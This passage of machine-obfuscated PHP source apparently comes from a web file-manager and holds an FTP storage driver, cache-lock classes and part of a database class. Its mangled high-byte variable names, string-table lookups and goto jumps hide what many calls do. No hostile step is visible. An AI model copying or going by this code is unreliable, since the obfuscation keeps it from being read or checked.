$_SERVER[ªÏ§Ë·]; global $config; $this->appCharset = $config[$¹ÌŸÎæª[1377]]; $this->systemCharset = $config[$¹ÌŸÎæª[1378]]; if (isset($¬£×„‚Ô[$¹ÌŸÎæª[1379]]) && $¬£×„‚Ô[$¹ÌŸÎæª[1379]]) { $this->systemCharset = $¬£×„‚Ô[$¹ÌŸÎæª[1379]]; } } public function iconvApp($Çø¹ôì¹) { return $this->iconvTo($Çø¹ôì¹, $this->systemCharset, $this->appCharset); } public function iconvSystem($Í¸‡ˆƒ¤) { return $this->iconvTo($Í¸‡ˆƒ¤, $this->appCharset, $this->systemCharset); } public function getPathOuter($›óóÃûğ) { $öÈ·Ì¸± =& $_SERVER[ªÏ§Ë·]; $Ç÷™ñ«­ = $this->iconvApp($this->pathBase); $›óóÃûğ = $this->iconvApp($›óóÃûğ); if (substr($Ç÷™ñ«­, 0, 2) == $öÈ·Ì¸±[1303]) { $Ç÷™ñ«­ = BASIC_PATH . substr($Ç÷™ñ«­, 2); } if (substr($›óóÃûğ, 0, 2) == $öÈ·Ì¸±[1303]) { $›óóÃûğ = BASIC_PATH . substr($›óóÃûğ, 2); } $Ç÷™ñ«­ = KodIO::clear($Ç÷™ñ«­); $›óóÃûğ = KodIO::clear($›óóÃûğ); $›óóÃûğ = substr($›óóÃûğ, strlen($Ç÷™ñ«­)); if (empty($this->pathDriver)) { return $›óóÃûğ; } return $this->pathDriver . $öÈ·Ì¸±[8] . ltrim($›óóÃûğ, $öÈ·Ì¸±[8]); } private function _init($‚äß–‰† = array()) { $­½Ã°ï =& $_SERVER[ªÏ§Ë·]; if (!function_exists($­½Ã°ï[1380])) { throw new Exception(LNG($­½Ã°ï[1381])); } $this->config = $‚äß–‰†; $this->charsetReset($‚äß–‰†); foreach ($‚äß–‰† as $Ã©ÀÓîõ => $·÷ºí­µ) { if (isset($this->{$Ã©ÀÓîõ})) { $this->{$Ã©ÀÓîõ} = $·÷ºí­µ; } } return $this->_login($‚äß–‰†); } private function _login($€æóâ§ç) { $µğüœ·Å =& $_SERVER[ªÏ§Ë·]; static $ÄéÔ§Íƒ = array(); $ûÀé = md5(json_encode($€æóâ§ç)); if (isset($ÄéÔ§Íƒ[$ûÀé])) { foreach ($ÄéÔ§Íƒ[$ûÀé] as $í²Ëè†õ => $ÏÙâ´èù) { $this->{$í²Ëè†õ} = $ÏÙâ´èù; } return !0; } $šĞ½Å£ô = parse_url(trim($this->server, $µğüœ·Å[8])); $this->host = $šĞ½Å£ô[$µğüœ·Å[192]]; $¬øÅãæ™ = isset($šĞ½Å£ô[$µğüœ·Å[191]]) && $šĞ½Å£ô[$µğüœ·Å[191]] == $µğüœ·Å[1382] ? !0 : !1; $this->scheme = $¬øÅãæ™ ? $µğüœ·Å[1383] : $µğüœ·Å[1384]; $this->port = isset($šĞ½Å£ô[$µğüœ·Å[193]]) ? $šĞ½Å£ô[$µğüœ·Å[193]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $¡ÕéÈÊ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $äùñë½ç = $this->pasv == $µğüœ·Å[98] ? !0 : !1; @ftp_pasv($this->connect, $äùñë½ç); $ÄéÔ§Íƒ[$ûÀé] = array($µğüœ·Å[1385] => $this->connect, $µğüœ·Å[192] => $this->host, $µğüœ·Å[191] => $this->scheme, $µğüœ·Å[193] => $this->port); return $¡ÕéÈÊ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($„ÖŒ–ÎÑ, $¨ÕçÃé· = '', $‡ãÆ¼‚š = REPEAT_RENAME) { if ($this->setContent($„ÖŒ–ÎÑ, $¨ÕçÃé·)) { return $this->getPathOuter($„ÖŒ–ÎÑ); } return !1; } public function mkdir($ğˆçÕ¬º, $Š¡¡ª¶ß = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ğˆçÕ¬º = $this->iconvSystem($ğˆçÕ¬º); if ($this->_isFolder($ğˆçÕ¬º) || @ftp_mkdir($this->connect, $ğˆçÕ¬º)) { return $this->getPathOuter($ğˆçÕ¬º); } if (!$this->mkdir($this->pathFather($ğˆçÕ¬º))) { return !1; } if ($ğˆçÕ¬º = @ftp_mkdir($this->connect, $ğˆçÕ¬º)) { return $this->getPathOuter($ğˆçÕ¬º); } return !1; } public function copyFile($ •¯Îâ, $êé—¯Ğ×) { if (!$this->_isconn()) { return !1; } $‡êÁ‹Ñ» = $this->pathThis($this->iconvSystem($ •¯Îâ)); $¾¥Ø™Ô– = $this->tempFile($‡êÁ‹Ñ»); $ÌÕøÓõã = $this->iconvApp($¾¥Ø™Ô–); $this->download($ •¯Îâ, $ÌÕøÓõã); $Õ„õŠçœ = $this->upload($êé—¯Ğ×, $ÌÕøÓõã); $this->tempFileRemve($¾¥Ø™Ô–); return $Õ„õŠçœ; } public function moveFile($Ã„×‘½ñ, $¶Ö˜“¾‘) { if (!$this->_isconn()) { return !1; } $Ã„×‘½ñ = $this->iconvSystem($Ã„×‘½ñ); $¶Ö˜“¾‘ = $this->iconvSystem($¶Ö˜“¾‘); $¶”²æÎı = @ftp_rename($this->connect, $Ã„×‘½ñ, $¶Ö˜“¾‘); return $¶”²æÎı ? $this->getPathOuter($¶Ö˜“¾‘) : !1; } public function delFile($€æíê¯«) { if (!$this->_isconn()) { return !1; } $€æíê¯« = $this->iconvSystem($€æíê¯«); return @ftp_delete($this->connect, $€æíê¯«); } public function delFolder($É¨â¼Ş ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ÁÍÑÈ¾Õ = $ŠªÈÔ¨ = array(); $this->fileList($É¨â¼Ş , $ÁÍÑÈ¾Õ, $ŠªÈÔ¨, !0); $this->listItemCache = !0; foreach ($ŠªÈÔ¨ as $Ç»ª¥£‰) { $ì¶™ñÔ = $this->iconvSystem($Ç»ª¥£‰[$_SERVER[ªÏ§Ë·][42]]); $¬Ù„ş§’ = @ftp_delete($this->connect, $ì¶™ñÔ); if (!$¬Ù„ş§’) { return !1; } } foreach ($ÁÍÑÈ¾Õ as $ì¶™ñÔ) { $ì¶™ñÔ = $this->iconvSystem($ì¶™ñÔ); $¬Ù„ş§’ = @ftp_rmdir($this->connect, $ì¶™ñÔ); if (!$¬Ù„ş§’) { return !1; } } $É¨â¼Ş  = $this->iconvSystem($É¨â¼Ş ); return @ftp_rmdir($this->connect, $É¨â¼Ş ); } public function rename($ßÎ“şú£, $Ó×™ô™¶) { $üÛ÷ğ›Ù =& $_SERVER[ªÏ§Ë·]; if (!$this->_isconn()) { return !1; } $„ëÇÙ‡Š = $this->fileNameAuto($this->pathFather($ßÎ“şú£), $Ó×™ô™¶); $„ëÇÙ‡Š = $this->iconvSystem($„ëÇÙ‡Š); $ßÎ“şú£ = $this->iconvSystem($ßÎ“şú£); $ÍÜ‚§¬ = $this->pathFather($ßÎ“şú£); $­Ÿ¿£ = rtrim($ÍÜ‚§¬, $üÛ÷ğ›Ù[8]) . $üÛ÷ğ›Ù[8] . $„ëÇÙ‡Š; $ıîşåÁ£ = @ftp_rename($this->connect, $ßÎ“şú£, $­Ÿ¿£); $­Ÿ¿£ = $this->iconvApp($­Ÿ¿£); return $ıîşåÁ£ ? $this->getPathOuter($­Ÿ¿£) : !1; } private function folderInfo($¡ —û‰Û, $ú†‚¶™ = false) { $ø¦«Í–ì =& $_SERVER[ªÏ§Ë·]; $œœÖ¬Ú = array($ø¦«Í–ì[42] => $this->pathThis($¡ —û‰Û), $ø¦«Í–ì[94] => $this->getPathOuter($ø¦«Í–ì[8] . $¡ —û‰Û), $ø¦«Í–ì[43] => $ø¦«Í–ì[85]); if ($ú†‚¶™) { return $œœÖ¬Ú; } $œœÖ¬Ú[$ø¦«Í–ì[211]] = $œœÖ¬Ú[$ø¦«Í–ì[95]] = 0; $œœÖ¬Ú[$ø¦«Í–ì[212]] = $œœÖ¬Ú[$ø¦«Í–ì[213]] = !0; return $œœÖ¬Ú; } private function fileInfo($º÷¶£, $³øÇÊÆÈ = false, $îÒ¸ĞËƒ = array()) { $Û‰Ç°ãĞ =& $_SERVER[ªÏ§Ë·]; $İ¢ÙÕğ´ = array($Û‰Ç°ãĞ[42] => $this->pathThis($º÷¶£), $Û‰Ç°ãĞ[94] => $this->getPathOuter($Û‰Ç°ãĞ[8] . $º÷¶£), $Û‰Ç°ãĞ[43] => $Û‰Ç°ãĞ[210], $Û‰Ç°ãĞ[86] => isset($îÒ¸ĞËƒ[$Û‰Ç°ãĞ[86]]) ? $îÒ¸ĞËƒ[$Û‰Ç°ãĞ[86]] : 0, $Û‰Ç°ãĞ[184] => $this->ext($º÷¶£)); if ($³øÇÊÆÈ) { return $İ¢ÙÕğ´; } $İ¢ÙÕğ´[$Û‰Ç°ãĞ[211]] = $İ¢ÙÕğ´[$Û‰Ç°ãĞ[95]] = 0; $İ¢ÙÕğ´[$Û‰Ç°ãĞ[212]] = $İ¢ÙÕğ´[$Û‰Ç°ãĞ[213]] = !0; $Ùœ¿¯ù› = $this->iconvSystem($º÷¶£); $İ¢ÙÕğ´[$Û‰Ç°ãĞ[95]] = @ftp_mdtm($this->connect, $Ùœ¿¯ù›); if (empty($îÒ¸ĞËƒ)) { $îÒ¸ĞËƒ = $this->objectMeta($º÷¶£); if (!$îÒ¸ĞËƒ) { return $İ¢ÙÕğ´; } } $İ¢ÙÕğ´[$Û‰Ç°ãĞ[86]] = $îÒ¸ĞËƒ[$Û‰Ç°ãĞ[86]]; return $İ¢ÙÕğ´; } public function size($øÏ™²ú¨) { $ºèì¶¿Ÿ = $this->objectMeta($øÏ™²ú¨); return $ºèì¶¿Ÿ ? $ºèì¶¿Ÿ[$_SERVER[ªÏ§Ë·][86]] : 0; } public function info($›“É¾Í) { if ($this->isFile($›“É¾Í)) { return $this->fileInfo($›“É¾Í, 0); } else { if ($this->isFolder($›“É¾Í)) { return $this->folderInfo($›“É¾Í); } } return !1; } private function fileList($¨À€’¾–, &$Åº½Ü‘›, &$…†•Í, $—¤´ğ®ß = false) { $Ğ‰ÚñúÙ =& $_SERVER[ªÏ§Ë·]; $¨À€’¾– = $this->iconvSystem($¨À€’¾–); if (!$this->isFolder($¨À€’¾–)) { return !1; } @ftp_chdir($this->connect, $Ğ‰ÚñúÙ[8]); $¨À€’¾– = rtrim($¨À€’¾–, $Ğ‰ÚñúÙ[8]) . $Ğ‰ÚñúÙ[8]; check_abort(); $¾îó¨È = @ftp_rawlist($this->connect, $¨À€’¾–); if (!$¾îó¨È) { $¾îó¨È = array(); } $åšÌ–Ë¼ = array($Ğ‰ÚñúÙ[10] => 1, $Ğ‰ÚñúÙ[1304] => 1); foreach ($¾îó¨È as $Çå½®Ñó) { $¶µÖ›Û… = $this->_listItem($Çå½®Ñó); if ($¶µÖ›Û…[0] == $Ğ‰ÚñúÙ[786]) { continue; } $Û¾»Åµë = $¶µÖ›Û…[8]; if (empty($Û¾»Åµë) && $Û¾»Åµë !== $Ğ‰ÚñúÙ[208] || isset($åšÌ–Ë¼[$Û¾»Åµë])) { continue; } $Û¾»Åµë = $this->iconvApp($¨À€’¾– . ltrim($Û¾»Åµë, $Ğ‰ÚñúÙ[8])); $ÌéÆ“ãì = array($Ğ‰ÚñúÙ[42] => $Û¾»Åµë, $Ğ‰ÚñúÙ[43] => $Ğ‰ÚñúÙ[210], $Ğ‰ÚñúÙ[86] => $¶µÖ›Û…[4]); if (substr($Çå½®Ñó, 0, 1) == $Ğ‰ÚñúÙ[1386]) { $ÌéÆ“ãì[$Ğ‰ÚñúÙ[43]] = $Ğ‰ÚñúÙ[85]; $ÌéÆ“ãì[$Ğ‰ÚñúÙ[86]] = 0; } $˜áŠêµú = $ÌéÆ“ãì[$Ğ‰ÚñúÙ[43]] == $Ğ‰ÚñúÙ[85] ? !0 : !1; $this->cacheMethodInfoSet($Û¾»Åµë, $˜áŠêµú, $ÌéÆ“ãì); if ($˜áŠêµú) { $Åº½Ü‘›[] = $Û¾»Åµë; if ($—¤´ğ®ß) { $this->fileList($Û¾»Åµë, $Åº½Ü‘›, $…†•Í, $—¤´ğ®ß); } continue; } $…†•Í[] = $ÌéÆ“ãì; } $this->cacheMethodInfoSet($¨À€’¾–, !0); } private function _listItem($·ˆÙ¨ÌÆ) { if (empty($·ˆÙ¨ÌÆ)) { return array(); } $ø½ÈÕßÂ = preg_split($_SERVER[ªÏ§Ë·][1387], $·ˆÙ¨ÌÆ); if (count($ø½ÈÕßÂ) <= 9) { return $ø½ÈÕßÂ; } $ø½ÈÕßÂ[8] = trim(substr($·ˆÙ¨ÌÆ, strpos($·ˆÙ¨ÌÆ, $ø½ÈÕßÂ[7]) + strlen($ø½ÈÕßÂ[7]))); return array_splice($ø½ÈÕßÂ, 0, 9); } public function listPath($–Í£‹ıª, $¡ÀÇßî‰ = false) { $û¥´®· =& $_SERVER[ªÏ§Ë·]; if (!$this->_isconn()) { return !1; } $ÉĞµàşİ = $ÖÎµÕô¬ = array(); $this->fileList($–Í£‹ıª, $ÉĞµàşİ, $ÖÎµÕô¬); foreach ($ÉĞµàşİ as $ƒ¤Âòëò => $ÇÙ»®’Ù) { $ÉĞµàşİ[$ƒ¤Âòëò] = $this->folderInfo($ÇÙ»®’Ù, $¡ÀÇßî‰); } foreach ($ÖÎµÕô¬ as $ƒ¤Âòëò => $ÇÙ»®’Ù) { $ÖÎµÕô¬[$ƒ¤Âòëò] = $this->fileInfo($ÇÙ»®’Ù[$û¥´®·[42]], $¡ÀÇßî‰, $ÇÙ»®’Ù); } return array($û¥´®·[92] => $ÉĞµàşİ, $û¥´®·[93] => $ÖÎµÕô¬); } public function has($ô¦è›»¡, $âÖËœ· = false, $á¥¸óÚ = true) { $®á¡ûÖ™ =& $_SERVER[ªÏ§Ë·]; $Â¿õµ´¹ = $ïğ¯ÔÈ€ = array(); $Îã±Ö = $âÖËœ· ? !0 : !1; $this->fileList($ô¦è›»¡, $Â¿õµ´¹, $ïğ¯ÔÈ€, $Îã±Ö); if ($âÖËœ·) { return array($®á¡ûÖ™[217] => count($ïğ¯ÔÈ€), $®á¡ûÖ™[218] => count($Â¿õµ´¹)); } if ($á¥¸óÚ) { if (count($ïğ¯ÔÈ€)) { return !0; } } else { if (count($Â¿õµ´¹)) { return !0; } } return !1; } public function listAll($Ã·»–í) { $òç§Éî =& $_SERVER[ªÏ§Ë·]; if (!$this->_isconn()) { return !1; } $ìö…êç™ = $àæù¿¾ = array(); $this->fileList($Ã·»–í, $ìö…êç™, $àæù¿¾, !0); $’éº˜×± = array_to_keyvalue($àæù¿¾, $òç§Éî[42]); foreach ($ìö…êç™ as $õÃéè †) { if (is_string($õÃéè †)) { $’éº˜×±[$õÃéè †] = array($òç§Éî[86] => 0); } } return $this->listAllFiles($Ã·»–í, $’éº˜×±); } public function getContent($£Ù¶•¥—) { if (!$this->_isconn()) { return !1; } $£Ù¶•¥— = $this->iconvSystem($£Ù¶•¥—); return $this->fileSubstr($£Ù¶•¥—); } public function setContent($„‹âèîÕ, $©™ÑğôÑ = '') { if (!$this->_isconn()) { return !1; } $ĞºÏ÷¸î = $this->pathThis($this->iconvSystem($„‹âèîÕ)); $ø„çì = $this->tempFile($ĞºÏ÷¸î); file_put_contents($ø„çì, $©™ÑğôÑ); $•ÖÇ‹Ã = $this->upload($„‹âèîÕ, $this->iconvApp($ø„çì)); $this->tempFileRemve($ø„çì); return $•ÖÇ‹Ã; } public function fileSubstr($‹ÈÎº€, $Í·Ù›‘ã = 0, $©ÖŸæ¸ã = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($‹ÈÎº€, $Í·Ù›‘ã, $©ÖŸæ¸ã); } private function ftpRequest($ûãşä•ò, $¨¯÷¶§Ğ = 0, $×Ä“Í¿Œ = false) { $ûãşä•ò = $this->iconvSystem($ûãşä•ò); $ÌØ†ù†Ê = $this->scheme . $this->host . $_SERVER[ªÏ§Ë·][4] . $this->port; $—¼¨úû = curl_init(); curl_setopt($—¼¨úû, CURLOPT_URL, $ÌØ†ù†Ê . $this->pathEncode($ûãşä•ò)); curl_setopt($—¼¨úû, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($×Ä“Í¿Œ) { $€¿Ğ¿â† = $¨¯÷¶§Ğ + $×Ä“Í¿Œ - 1; curl_setopt($—¼¨úû, CURLOPT_RANGE, "{$¨¯÷¶§Ğ}\x2d{$€¿Ğ¿â†}"); } curl_setopt($—¼¨úû, CURLOPT_RETURNTRANSFER, 1); $¡Èìç¡ = curl_exec($—¼¨úû); curl_close($—¼¨úû); return $¡Èìç¡; } public function upload($‰‘£Ä°Ò, $ê³ÉÚì, $ğ¢×³  = false, $¶Í‚üÛ‘ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($‰‘£Ä°Ò))) { return !1; } $‰‘£Ä°Ò = $this->iconvSystem($‰‘£Ä°Ò); $ê³ÉÚì = $this->iconvSystem($ê³ÉÚì); $ê¿ßø» = ftp_nb_put($this->connect, $‰‘£Ä°Ò, $ê³ÉÚì, FTP_BINARY); while ($ê¿ßø» == FTP_MOREDATA) { $ê¿ßø» = ftp_nb_continue($this->connect); } if ($ê¿ßø» != FTP_FINISHED) { return !1; } return $this->getPathOuter($‰‘£Ä°Ò); } public function download($¡¶êì¡ö, $õ˜È×úï = '') { if (!$this->_isconn()) { return !1; } $ĞÎ…ÇÀ¡ = $this->pathFather($õ˜È×úï); if (!IO::mkdir($ĞÎ…ÇÀ¡)) { return !1; } $¡¶êì¡ö = $this->iconvSystem($¡¶êì¡ö); $õ˜È×úï = $this->iconvSystem($õ˜È×úï); $ÎÛ³à« = ftp_nb_get($this->connect, $õ˜È×úï, $¡¶êì¡ö, FTP_BINARY); while ($ÎÛ³à« == FTP_MOREDATA) { $ÎÛ³à« = ftp_nb_continue($this->connect); } if ($ÎÛ³à« != FTP_FINISHED) { return !1; } return $this->iconvApp($õ˜È×úï); } public function exist($ÛÓ®£¹Ö) { return $this->isFile($ÛÓ®£¹Ö) || $this->isFolder($ÛÓ®£¹Ö); } public function isFile($Çİ›åÉÀ) { return !$this->isFolder($Çİ›åÉÀ) && $this->objectMeta($Çİ›åÉÀ); } public function isFolder($„¬ƒó¢¢) { return $this->cacheMethod($_SERVER[ªÏ§Ë·][175], $„¬ƒó¢¢); } protected function objectMeta($ÏË§‰´) { return $this->cacheMethod($_SERVER[ªÏ§Ë·][177], $ÏË§‰´); } protected function _objectMeta($Å˜©àÒ ) { $÷î™Íæ =& $_SERVER[ªÏ§Ë·]; if ($Å˜©àÒ  == $÷î™Íæ[12] || $Å˜©àÒ  == $÷î™Íæ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Å˜©àÒ  = $this->iconvSystem($Å˜©àÒ ); $ĞÂäöÏØ = array($÷î™Íæ[42] => $this->iconvApp($Å˜©àÒ ), $÷î™Íæ[43] => $÷î™Íæ[210], $÷î™Íæ[86] => 0); @ftp_chdir($this->connect, $÷î™Íæ[8]); $›Øãø¾¾ = @ftp_size($this->connect, $Å˜©àÒ ); if ($›Øãø¾¾ != -1) { $ĞÂäöÏØ[$÷î™Íæ[86]] = $›Øãø¾¾; } else { $ÑµÎí€œ = @ftp_chdir($this->connect, $Å˜©àÒ ); if (!$ÑµÎí€œ) { return !1; } $ĞÂäöÏØ[$÷î™Íæ[43]] = $÷î™Íæ[85]; } return $ĞÂäöÏØ; } protected function _isFolder($¯¼ÀøŸ) { $Ş³‘±Íë =& $_SERVER[ªÏ§Ë·]; if ($¯¼ÀøŸ == $Ş³‘±Íë[12] || $¯¼ÀøŸ == $Ş³‘±Íë[8]) { return !0; } $§Û½€Ä° = $this->_objectMeta($¯¼ÀøŸ); return isset($§Û½€Ä°[$Ş³‘±Íë[43]]) && $§Û½€Ä°[$Ş³‘±Íë[43]] == $Ş³‘±Íë[85] ? !0 : !1; } } goto f¦ƒî…ĞÅØ; FœŒ¿ù«Ãİ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $²”­¾à =& $_SERVER[ªÏ§Ë·]; $¹¨ƒãúó = $GLOBALS[$²”­¾à[6]][$²”­¾à[387]]; self::$cachePath = $¹¨ƒãúó[$²”­¾à[210]][$²”­¾à[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ˆÈËøÑÚ, $Ã¤È‹‚ú = 0) { $ö•Êğß½ =& $_SERVER[ªÏ§Ë·]; $ĞÆĞ÷ = microtime(!0); $·õ¡Åšá = $ĞÆĞ÷ + $Ã¤È‹‚ú + 0.0001; $¡Œù×¯ = rtrim(self::$cachePath, $ö•Êğß½[8]) . $ö•Êğß½[891] . md5($ˆÈËøÑÚ) . $ö•Êğß½[888]; if (file_exists($¡Œù×¯) && filemtime($¡Œù×¯) && filemtime($¡Œù×¯) < time() - 10) { @unlink($¡Œù×¯); } do { if (file_exists($¡Œù×¯)) { cacheLockWait(); continue; } $äÎú«ãœ = fopen($¡Œù×¯, $ö•Êğß½[892]); if (!$äÎú«ãœ) { return !1; } $¿€Äµ à = flock($äÎú«ãœ, LOCK_EX | LOCK_NB); self::$caches[$ˆÈËøÑÚ] = array($ö•Êğß½[893] => $äÎú«ãœ, $ö•Êğß½[210] => $¡Œù×¯); fwrite($äÎú«ãœ, $·õ¡Åšá); clearstatcache(); if ($äÎú«ãœ && $¿€Äµ à) { return !0; } cacheLockWait(); } while (microtime(!0) < $·õ¡Åšá); $this->unlock($ˆÈËøÑÚ); return !1; } public function lockGet($ÑàÚ­úı) { $®ñó›³ì =& $_SERVER[ªÏ§Ë·]; $÷µ•¤¦• = rtrim(self::$cachePath, $®ñó›³ì[8]) . $®ñó›³ì[891] . md5($ÑàÚ­úı) . $®ñó›³ì[888]; return file_exists($÷µ•¤¦•); } public function unlock($ÓğšØåÇ) { $ İü¶‚ =& $_SERVER[ªÏ§Ë·]; $‚ÍÄ¼üœ = self::$caches[$ÓğšØåÇ]; if (!$‚ÍÄ¼üœ) { return; } @flock($‚ÍÄ¼üœ[$ İü¶‚[893]], LOCK_UN); @fclose($‚ÍÄ¼üœ[$ İü¶‚[893]]); @unlink($‚ÍÄ¼üœ[$ İü¶‚[210]]); unset(self::$caches[$ÓğšØåÇ]); } } class CacheLockRedis { public function lock($ÖòÑ“ş¡, $ôæ¨­À = 10) { $ÊıØó‡ = Cache::init(); $›áæ„° = microtime(!0) + $ôæ¨­À; while (microtime(!0) < $›áæ„°) { $®«Ù¹Ò© = $ÊıØó‡->get($ÖòÑ“ş¡); if (!$®«Ù¹Ò©) { $ô¹ˆùí = $ÊıØó‡->setLock($ÖòÑ“ş¡, $›áæ„°, $ôæ¨­À); if ($ô¹ˆùí) { return !0; } } else { if ($®«Ù¹Ò© < microtime(!0)) { $ÊıØó‡->set($ÖòÑ“ş¡, $›áæ„°, $ôæ¨­À * 2); if ($ÊıØó‡->get($ÖòÑ“ş¡) === $®«Ù¹Ò©) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¨àªò™Û) { return Cache::init()->get($¨àªò™Û); } public function unlock($÷ı×©š“) { return Cache::init()->remove($÷ı×©š“); } } class CacheLockMemcached { public function lock($„àÈÍ’±, $şÏŸ¢ü = 0) { $„·ë Œø = Cache::init(); $¿ßó»¿ı = microtime(!0) + $şÏŸ¢ü; while (microtime(!0) < $¿ßó»¿ı) { $œŸ¥‘ı = $„·ë Œø->get($„àÈÍ’±); if (!$œŸ¥‘ı || $œŸ¥‘ı < microtime(!0)) { $î¦ÎÌË = $„·ë Œø->handle->add($„àÈÍ’±, $¿ßó»¿ı, $şÏŸ¢ü); if ($î¦ÎÌË) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($˜Ô•›Éæ) { return Cache::init()->get($˜Ô•›Éæ); } public function unlock($ıº†¨Å§) { return Cache::init()->remove($ıº†¨Å§); } } goto DŸò©Ç¿ˆ¦; D×ÍÈˆÅ ¤: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\x65\161" => "\x3c\x3e", "\x67\x74" => "\x3e", "\145\147\x74" => "\76\75", "\x6c\x74" => "\74", "\x65\x6c\x74" => "\x3c\x3d", "\x6e\157\164\154\x69\153\x65" => "\116\117\124\x20\114\x49\113\x45", "\x6c\x69\x6b\145" => "\114\111\113\x45", "\151\x6e" => "\111\x4e", "\156\157\164\x69\x6e" => "\116\117\x54\x20\x49\116", "\x6e\x6f\164\40\151\156" => "\x4e\x4f\124\40\111\x4e", "\x62\145\x74\x77\145\x65\x6e" => "\x42\105\124\x57\x45\x45\x4e", "\x6e\157\164\x62\x65\164\x77\x65\145\156" => "\x4e\x4f\124\40\102\105\124\127\x45\105\116", "\156\x6f\x74\x20\x62\145\x74\x77\145\x65\156" => "\116\117\x54\x20\x42\x45\124\127\105\x45\x4e"); protected $selectSql = "\x53\x45\x4c\105\x43\124\x25\104\111\x53\124\x49\116\103\124\45\40\45\x46\x49\105\x4c\104\x25\40\106\x52\117\x4d\x20\x25\x54\x41\x42\x4c\x45\x25\45\112\117\111\x4e\45\45\127\110\x45\x52\x45\x25\45\107\122\x4f\x55\120\x25\x25\110\101\126\x49\116\107\45\x25\117\122\x44\105\122\x25\x25\114\x49\115\111\124\x25\40\45\x55\x4e\111\117\116\45\x25\103\x4f\115\x4d\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $¾Éë™¹¥ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ªÏ§Ë·][985], $¾Éë™¹¥); } public function factory($Ü¥Ò»°ø = '') { $¡ã±†‰— =& $_SERVER[ªÏ§Ë·]; $Ü¥Ò»°ø = $this->parseConfig($Ü¥Ò»°ø); if (empty($Ü¥Ò»°ø[$¡ã±†‰—[986]])) { think_exception(think_lang($¡ã±†‰—[987])); } $this->dbType = ucwords(strtolower($Ü¥Ò»°ø[$¡ã±†‰—[986]])); $À¸úßíš = $¡ã±†‰—[988] . $this->dbType; if (class_exists($À¸úßíš)) { $ÃˆÕÇ»Û = new $À¸úßíš($Ü¥Ò»°ø); if ($¡ã±†‰—[989] != strtolower($Ü¥Ò»°ø[$¡ã±†‰—[986]])) { $ÃˆÕÇ»Û->dbType = strtoupper($this->dbType); } else { $ÃˆÕÇ»Û->dbType = $this->_getDsnType($Ü¥Ò»°ø[$¡ã±†‰—[941]]); } } else { think_exception(think_lang($¡ã±†‰—[990]) . $¡ã±†‰—[991] . $À¸úßíš); } return $ÃˆÕÇ»Û; } public function __call($İ—Ê¸û, $ÒÓ•ÜÌı) { if (method_exists($this, $İ—Ê¸û)) { return call_user_func_array(array($this, $İ—Ê¸û), $ÒÓ•ÜÌı); } } protected function _getDsnType($ •ØŸÈ†) { $åß¾åºö = explode($_SERVER[ªÏ§Ë·][4], $ •ØŸÈ†); $ÈØŸŠËš = strtoupper(trim($åß¾åºö[0])); return $ÈØŸŠËš; } private function parseConfig($šúÒ©È = '') { $ªÊ›Š©­ =& $_SERVER[ªÏ§Ë·]; if (!empty($šúÒ©È) && is_string($šúÒ©È)) { $šúÒ©È = $this->parseDSN($šúÒ©È); } elseif (is_array($šúÒ©È)) { $šúÒ©È = array_change_key_case($šúÒ©È); $šúÒ©È = array($ªÊ›Š©­[986] => $šúÒ©È[$ªÊ›Š©­[992]], $ªÊ›Š©­[913] => $šúÒ©È[$ªÊ›Š©­[993]], $ªÊ›Š©­[914] => $šúÒ©È[$ªÊ›Š©­[994]], $ªÊ›Š©­[911] => $šúÒ©È[$ªÊ›Š©­[995]], $ªÊ›Š©­[912] => $šúÒ©È[$ªÊ›Š©­[996]], $ªÊ›Š©­[31] => $šúÒ©È[$ªÊ›Š©­[997]], $ªÊ›Š©­[941] => $šúÒ©È[$ªÊ›Š©­[998]], $ªÊ›Š©­[27] => isset($šúÒ©È[$ªÊ›Š©­[999]]) ? $šúÒ©È[$ªÊ›Š©­[999]] : array()); } elseif (empty($šúÒ©È)) { if (think_config($ªÊ›Š©­[1000]) && $ªÊ›Š©­[989] != strtolower(think_config($ªÊ›Š©­[1001]))) { $šúÒ©È = $this->parseDSN(think_config($ªÊ›Š©­[1000])); } else { $šúÒ©È = array($ªÊ›Š©­[986] => think_config($ªÊ›Š©­[1001]), $ªÊ›Š©­[913] => think_config($ªÊ›Š©­[1002]), $ªÊ›Š©­[914] => think_config($ªÊ›Š©­[1003]), $ªÊ›Š©­[911] => think_config($ªÊ›Š©­[1004]), $ªÊ›Š©­[912] => think_config($ªÊ›Š©­[1005]), $ªÊ›Š©­[31] => think_config($ªÊ›Š©­[284]), $ªÊ›Š©­[941] => think_config($ªÊ›Š©­[1000]), $ªÊ›Š©­[27] => think_config($ªÊ›Š©­[1006])); } } return $šúÒ©È; } protected function initConnect($ì•ªÒµ« = true) { if (1 == think_config($_SERVER[ªÏ§Ë·][32])) { $this->_linkID = $this->multiConnect($ì•ªÒµ«); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Õ¢Úï¹» => $¿ù÷¶±) { $this->_linkID = $¿ù÷¶±; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($’¨³©ôê = false) { $Ö¤Ë ¢× =& $_SERVER[ªÏ§Ë·]; 